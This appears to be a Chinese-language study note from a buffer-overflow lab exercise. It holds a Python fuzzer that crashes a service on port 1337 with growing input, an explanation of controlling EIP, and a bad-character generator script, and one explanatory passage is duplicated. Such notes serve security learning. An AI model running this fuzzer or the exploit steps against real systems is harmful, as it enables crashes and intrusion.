#!/usr/bin/env python3
import socket, time, sys

ip = "10.10.152.153"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    #AF_INET常量用于指定IPv4地址族，SOCK_STREAM常量用于指定流式套接字
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
    	# 参数是一个元组
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)

    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

Crash Replication & Controlling EIP

学一下什么是EIP

在PWN学中，EIP代表Extended Instruction Pointer（扩展指令指针）。

EIP是x86体系结构中的一个寄存器，它存储着下一条将要执行的指令的内存地址。它在程序执行期间不断更新，指向即将执行的指令。

在二进制漏洞利用中，攻击者通常试图控制EIP寄存器的值，以便改变程序的执行流程。通过成功地控制EIP寄存器，攻击者可以将程序的控制流转移到攻击者精心构造的恶意代码上，实现执行任意代码的目的。

常见的漏洞类型，如缓冲区溢出、格式化字符串漏洞等，可以导致EIP被覆盖或劫持，从而控制程序的执行流程。攻击者通常通过在缓冲区中注入恶意数据来改变EIP的值，将其指向攻击者指定的内存地址，以执行恶意代码。

因此，EIP在PWN学中是一个重要的概念，攻击者需要了解和利用它来实现二进制漏洞的利用和攻击。

现在生成一个与字节数组相同的坏字符字符串。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
`"{:02x}".format(x)`是一个格式化字符串的语法，用于将整数`x`格式化为两位的十六进制数，并在不足两位时使用前导零进行填充。让我们逐个解释其中的每个部分：

- `{}` 是格式化字符串中的占位符，它表示将要插入一个值。
- `:02` 是格式规范，指定了对应的值的格式。
  - `:` 表示格式规范的开始。
  - `02` 表示将值格式化为两位宽度。如果值不足两位，则使用前导零进行填充。
- `x` 是格式规范的一部分，表示将值格式化为十六进制数。

因此，`"{:02x}".format(x)`中的`x`表示将整数`x`转换为两位的十六进制数，如果不足两位则用前导零填充。以下是一些示例：

- 当`x`的值为10时，`"{:02x}".format(x)`将生成字符串`"0a"`。
- 当`x`的值为255时，`"{:02x}".format(x)`将生成字符串`"ff"`。

在给定示例代码中，循环迭代的每个整数`x`都会通过`"{:02x}".format(x)`进行格式化，生成对应的两位十六进制数的字符串表示。这些字符串将被拼接并打印出来，形成从1到255的所有字节的十六进制转义序列。

`"{:02x}".format(x)`是一个格式化字符串的语法，用于将整数`x`格式化为两位的十六进制数，并在不足两位时使用前导零进行填充。让我们逐个解释其中的每个部分：

- `{}` 是格式化字符串中的占位符，它表示将要插入一个值。
- `:02` 是格式规范，指定了对应的值的格式。
  - `:` 表示格式规范的开始。
  - `02` 表示将值格式化为两位宽度。如果值不足两位，则使用前导零进行填充。
- `x` 是格式规范的一部分，表示将值格式化为十六进制数。

因此，`"{:02x}".format(x)`中的`x`表示将整数`x`转换为两位的十六进制数，如果不足两位则用前导零填充。以下是一些示例：

- 当`x`的值为10时，`"{:02x}".format(x)`将生成字符串`"0a"`。
- 当`x`的值为255时，`"{:02x}".format(x)`将生成字符串`"ff"`。
